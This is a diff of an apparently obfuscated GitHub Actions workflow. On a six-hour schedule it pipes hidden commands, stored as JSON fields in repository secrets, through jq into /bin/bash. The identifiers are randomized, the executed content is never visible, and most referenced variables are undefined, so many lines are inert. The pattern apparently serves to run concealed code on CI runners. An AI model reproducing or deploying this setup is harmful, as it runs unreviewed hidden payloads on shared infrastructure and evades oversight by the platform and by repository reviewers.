@@ -1,27 +1,31 @@
 name: wuyuqian9721
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 3/6 * * *'
+    - cron: '35 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wuyuqian9721
         env:
-          efc6577: ${{ secrets.efc6577 }}
+          irm527: ${{ secrets.irm527 }}
         run: |
-          echo $efc6577 | jq -r .h52784 | /bin/bash
-          echo $wb918 | jq -r .mysat53 | /bin/bash
-          echo $lyqh52719 | jq -r .omq2 | /bin/bash
-          echo $vxir236 | jq -r .mqmpi2512 | /bin/bash
-          echo $uuj087 | jq -r .grzi78039 | /bin/bash
-          echo $mv89342 | jq -r .wsgd986 | /bin/bash
-          echo $nj96 | jq -r .vg955 | /bin/bash
-          echo $jupz5961 | jq -r .eegk87 | /bin/bash
-          echo $om8913 | jq -r .slih7 | /bin/bash
-          echo $bwb629 | jq -r .sedlr20898 | /bin/bash
-          echo $rguch410 | jq -r .bh089 | /bin/bash
+          echo $irm527 | jq -r .kjqw114 | /bin/bash
+          echo $t50 | jq -r .wwgbd566 | /bin/bash
+          echo $bly4071 | jq -r .d02738 | /bin/bash
+          echo $kyw51 | jq -r .qiptr69573 | /bin/bash
+          echo $u34417 | jq -r .ij945 | /bin/bash
+          echo $by16 | jq -r .m08238 | /bin/bash
+          echo $x274 | jq -r .sp53 | /bin/bash
+          echo $o47 | jq -r .mt74672 | /bin/bash
+          echo $yofa629 | jq -r .kq23878 | /bin/bash
+          echo $roh3335 | jq -r .vnhpj83 | /bin/bash
+          echo $tlobj2 | jq -r .zy6 | /bin/bash
+          echo $a129 | jq -r .lusmh14411 | /bin/bash
+          echo $lypt76 | jq -r .ejm737 | /bin/bash
+          echo $tcjzm2215 | jq -r .iujhj8267 | /bin/bash
 
